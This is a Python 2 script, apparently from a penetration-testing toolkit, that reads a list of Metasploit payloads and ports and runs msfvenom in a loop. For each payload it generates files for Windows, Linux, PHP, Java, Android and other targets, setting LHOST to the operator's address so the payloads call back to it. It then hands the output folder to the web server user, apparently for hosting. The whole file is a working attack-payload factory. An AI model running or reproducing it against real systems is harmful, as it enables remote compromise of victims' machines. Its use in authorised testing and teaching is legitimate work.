#!/usr/bin/python
# -*- coding: utf-8 -*-

# Copyright (c) 2017, Carlos Polop Martin <carlospolop[at]gmail.com
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted
# provided that the following conditions are met:
#
# Redistributions of source code must retain the above copyright notice, this list of conditions and
# the following disclaimer.
#
# Redistributions in binary form must reproduce the above copyright notice, this list of conditions
# and the following disclaimer in the documentation and/or other materials provided with the
# distribution.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR
# IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
# FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR
# CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
# DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER
# IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT
# OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

import os
import subprocess
import re
import shutil
import sys

#from os import listdir
from random import randint
from config_paths import *

main_save_path = main_path+"msfve/"

#En msfconsole >irb y luego "framework.payloads.keys"

#def dir_walk(path):
#    directories = []
#    for base, dirs, files in os.walk(path):
#        for name in dirs:
#            directories.append(os.path.join(base,name))
#    return directories

#def file_walk(path):
#    archivos = []
#    for base, dirs, files in os.walk(path):
#        for name in files:
#            file_path = os.path.join(base,name)
#            if check_file(file_path):
#                archivos.append(file_path)
#    return archivos

def main_directory():
    if os.path.exists(main_save_path):
        shutil.rmtree(main_save_path)
    os.makedirs(main_save_path)

#Formato {payload:puerto , payload:puerto , payload:puerto , ...}
def payloads():
    payloads = {}
    f = open(payloads_path,'r')
    for line in f:
        linea = line.split(" ")
        if linea[1]:
            payloads[linea[0].strip()] = linea[1].strip()
    f.close()
    return payloads

def create_dir(directorio):
    create_dir_path = main_save_path + directorio
    if not os.path.exists(create_dir_path): os.makedirs(create_dir_path)

def formatos(payload):
    #{formato:extension}
    if "powershell" in payload:
        return [{"ps1":"ps1"}]
    elif "windows" in payload:
        return [{"exe":"exe"}]
    elif "linux" in payload:
        return [{"elf":"so"}]
    elif "php" in payload:
        return [{"raw":"php"}]
    elif "java" in payload:
        return [{"raw":"jsp"}, {"war":"war"}]
    elif "python" in payload:
        return ["py"]
    elif "ruby" in payload:
        return ["rb"]
    elif "android" in payload:
        return ["apk"]
    elif "osx" in payload:
        return ["."]
    else:
        return [""]

def msfvenom(payload,ext,lport):
    iterac = str(randint(1,10))
    global LHOST
    #options_rm = -n RAND"
    comando = "msfvenom -p "+payload+" LHOST="+LHOST+" LPORT="+str(lport)+" -b '\\x00' -e generic/none -i "+iterac
    payload_final = main_save_path + payload
    if type(ext) == str:
        extension = "." + ext
        comando += " -o " + payload_final + extension
    else:
        format_name = ext.keys()[0]
        extension = "." + ext[format_name]
        payload_final_ext = payload_final + extension
        comando += " -f "+format_name+" -o "+payload_final_ext
    print comando
    print "-------------------------------------------------"
    try:
        subprocess.check_output(comando, shell=True)
    except subprocess.CalledProcessError as e:
        print "Couldn't create the payload: "+payload
        print "Lets try whithout the option: -b '\\x00'"
        comando = comando.replace("-b '\\x00'", "")
        try:
            subprocess.check_output(comando, shell=True)
        except subprocess.CalledProcessError as e:
            print "Couldn't create the payload: "+payload

###############
## MAIN PART ##
###############
print ""
print "#################################################"
print "MSFVENOM:"
if len(sys.argv) > 1:
    if ip_validator(sys.argv[1]):
        LHOST = sys.argv[1]
    else:
        print "Give a correct Ip address"
        exit(-1)
else:
    LHOST = autoLHOST()
    print "Using IP: "+LHOST

main_directory()

payloads_dic = payloads()
for payload in payloads_dic.keys():
    lport = payloads_dic[payload]
    print ""
    print "#################################################"
    print "CREATING PAYLOAD: "+payload
    print "-------------------------------------------------"
    payload_name = re.search(r'/\w+$', payload)
    directorio = payload.replace(payload_name.group(),"")
    create_dir(directorio)

    formats = formatos(payload)
    for ext in formats:
        msfvenom(payload,ext,lport)
    print "_________________________________________________"
os.system("chown www-data -R "+main_save_path)
